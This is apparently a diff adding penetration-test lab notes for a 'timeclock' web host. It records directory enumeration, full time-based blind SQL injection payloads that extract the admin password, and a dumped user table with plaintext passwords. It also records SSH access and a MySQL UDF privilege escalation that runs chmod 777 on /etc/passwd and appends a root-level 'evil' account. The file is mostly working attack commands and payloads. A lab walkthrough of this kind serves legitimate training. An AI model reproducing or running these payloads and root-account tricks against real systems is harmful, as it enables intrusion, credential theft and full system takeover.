@@ -1,0 +1,109 @@
+# directories enumeration
+gobuster -u http://$IP:8000 dir -w /usr/share/wordlists/dirb/common.txt -q -e -x "php,html" -t 200 -o dir_enum.txt
+
+# found login page
+http://10.11.1.252:8000/login.php
+
+# running service
+timeclock
+
+# time based SQLi Ref: https://www.youtube.com/watch?v=xHzH00vyVHA
+# found time base SQLi
+# POC: the attacker can infer the condition is true or not by what the system's behavior (sleep or not)
+username=user'+AND+(SELECT+4247+FROM+(SELECT(sleep(10)))ztHm)+AND+'WHmv'='WHmv&password=pass&submit=Log+In
+
+# add condition
+username=user'+AND+(SELECT+4247+FROM+(SELECT+CASE+WHEN+(1=1)+THEN+sleep(10)+ELSE+sleep(0)+END)ztHm)+AND+'WHmv'='WHmv&password=pass&submit=Log+In
+
+# found admin user
+username=user'+AND+(SELECT+4247+FROM+(SELECT+CASE+WHEN+(username='admin')+THEN+sleep(10)+ELSE+sleep(0)+END+FROM+user_info)ztHm)+AND+'WHmv'='WHmv&password=pass&submit=Log+In
+
+# confirm password length is 15
+username=user'+AND+(SELECT+4247+FROM+(SELECT+CASE+WHEN+(username='admin'+AND+LENGTH(password)=15)+THEN+sleep(10)+ELSE+sleep(0)+END+FROM+user_info)ztHm)+AND+'WHmv'='WHmv&password=pass&submit=Log+In
+
+# check password character by character 
+username=user'+AND+(SELECT+4247+FROM+(SELECT+CASE+WHEN+(username='admin'+AND+SUBSTRING(password,1,1)='a')+THEN+sleep(10)+ELSE+sleep(0)+END+FROM+user_info)ztHm)+AND+'WHmv'='WHmv&password=pass&submit=Log+In
+
+# finally got admin credential
+admin:gy5sziw2up9lhyv
+
+# get users table
+ID 	Name 		Level 		Username 	Password 	
+1 	Admin, Admin 	Administrator 	admin  		GY5sziW2uP9LHyv  	
+5	Kasby, James 	User 		james  		FmyN3rZ37LNss2X  	
+8 	Maxwell, John 	Administrator 	j0hn  		bzuisJDnuI6WUDl  	
+6 	Michael, Carol 	User 		carol  		zaJUcrjG1JHNN8z 
+10 	Pumbaa, Grace 	User 		grace  		RGGhBuwr9MSJiOT  	
+7 	Smith, joshua 	User 		joshua  	QzdXVwvofAsfmZ8  	
+9 	Smith, Jessica 	User 		jessica  	2TtublVmeSAKFo6  	
+
+# found port 22000
+22000/tcp open  ssh     OpenSSH 4.3 (protocol 2.0)
+
+# add ssh configuration to avoid unmatch key exchange issue
+Host 10.11.1.252
+    User git
+    PubkeyAcceptedAlgorithms +ssh-rsa
+    HostkeyAlgorithms +ssh-rsa
+
+# login j0hn account (turned out only j0hn can be login)
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -o "KexAlgorithms=diffie-hellman-group-exchange-sha1" j0hn@$IP -p 22000
+
+# open ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+111/tcp  open  rpcbind
+443/tcp  open  https
+631/tcp  open  ipp
+720/tcp  open  unknown
+3306/tcp open  mysql
+
+# found machine ip address
+10.2.2.218
+
+# linux version ()
+Linux timeclock 2.6.18-164.11.1.el5
+
+# processes run as root
+root       565  0.0  0.1   2368   688 ?        S<s  20:46   0:00 /sbin/udevd -d                                                               
+root      2239  0.0  1.1  12412  5744 ?        S    20:46   0:00 /usr/sbin/vmtoolsd
+root      2286  0.0  1.4  13632  7724 ?        S    20:46   0:00 /usr/lib/vmware-vgauth/VGAuthService -s
+root      2599  0.0  0.1   1812   628 ?        Ss   20:46   0:00 syslogd -m 0
+root      2602  0.0  0.0   1760   420 ?        Ss   20:46   0:00 klogd -x
+root      2681  0.0  0.1   5612   580 ?        Ss   20:46   0:00 rpc.idmapd
+root      2736  0.0  0.2  27360  1368 ?        Ssl  20:46   0:00 automount
+root      2757  0.0  0.4  10228  2428 ?        Ss   20:46   0:00 cupsd
+root      2774  0.0  0.2   7180  1060 ?        Ss   20:46   0:00 /usr/sbin/sshd
+root      2791  0.0  0.1   2832   832 ?        Ss   20:46   0:00 xinetd -stayalive -pidfile /var/run/xinetd.pid
+root      2828  0.0  0.2   4624  1212 ?        S    20:46   0:00 /bin/sh /usr/bin/mysqld_safe --datadir=/var/lib/mysql --socket=/var/lib/mysql/mysql.sock --log-error=/var/log/mysqld.log --pid-file=/var/run/mysqld/mysqld.pid --user=mysql
+root      2875  0.0  3.4 137300 17680 ?        Sl   20:46   0:00  _ /usr/libexec/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=mysql --pid-file=/var/run/mysqld/mysqld.pid --skip-external-locking --socket=/var/lib/mysql/mysql.sock
+root      2906  0.0  0.0   1996   360 ?        Ss   20:46   0:00 gpm -m /dev/input/mice -t exps2
+root      2920  0.0  1.9  25000  9972 ?        Ss   20:46   0:00 /usr/sbin/httpd
+root      2933  0.0  0.2   5384  1096 ?        Ss   20:46   0:00 crond
+root      2946  0.0  0.0   1756   504 ?        SNs  20:46   0:00 anacron -s
+root      2951  0.0  0.0   1744   448 tty1     Ss+  20:46   0:00 /sbin/mingetty tty1
+root      2952  0.0  0.0   1744   440 tty2     Ss+  20:46   0:00 /sbin/mingetty tty2
+root      2953  0.0  0.0   1744   440 tty3     Ss+  20:46   0:00 /sbin/mingetty tty3
+root      2954  0.0  0.0   1744   448 tty4     Ss+  20:46   0:00 /sbin/mingetty tty4
+root      2955  0.0  0.0   1744   448 tty5     Ss+  20:46   0:00 /sbin/mingetty tty5
+root      2956  0.0  0.0   1744   444 tty6     Ss+  20:46   0:00 /sbin/mingetty tty6
+
+# found possible PE vector
+mysqld
+
+# found public exploit
+# supportive Ref: https://shakuganz.com/2021/09/12/mysql-root-account-privilege-escalation-via-user-defined-functions/
+-------------------------------------------------------------------------- -------------------------------
+ Exploit Title                                                            |  Path
+-------------------------------------------------------------------------- -------------------------------
+ MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)  | linux/local/1518.c
+
+# change the /etc/passwd permission during the sql exploit
+mysql> select do_system('chmod 777 /etc/passwd');
+
+# add evil:evil user (remember to escape the '$' sign with '\') 
+echo "evil:\$1\$salt\$wZfwL/sxSQKSDI4eO.JKF0:0:0:root:/root:/bin/bash" >> /etc/passwd
+
+# switch to be root
+su evil
